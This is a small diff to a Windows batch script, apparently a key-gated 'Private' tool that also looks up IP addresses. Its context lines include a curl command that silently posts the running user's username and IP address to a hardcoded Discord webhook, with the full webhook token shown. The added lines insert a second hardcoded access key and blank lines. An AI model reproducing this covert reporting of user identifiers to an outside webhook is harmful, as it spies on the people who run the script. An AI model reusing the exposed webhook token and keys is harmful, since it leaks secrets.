@@ -48,6 +48,8 @@ curl -H "Content-Type: application/json" ^
      -d "{\"content\":\"%user%: %IP%\"}" ^
      https://discord.com/api/webhooks/1467046301207232614/zt2uEwbYzeRSPtBYtCIn8MJ3sxWHy59BBM9T326T6XtNaYyLlV9j6cjcgGSsUKl7NHFe
 set VALID_KEY=3BQY-LTOR-8TRZ-E92R
+set VAILD_KEY=P8YW-L3NV-Q7CR-H5SK
+
 title Private
 echo Enter Your Key
 echo.
@@ -160,6 +162,7 @@ curl http://ip-api.com/json/%ip%
 pause >nul
 timeout /t 2 /nobreak >nul
 goto %home%
+
 
 
 
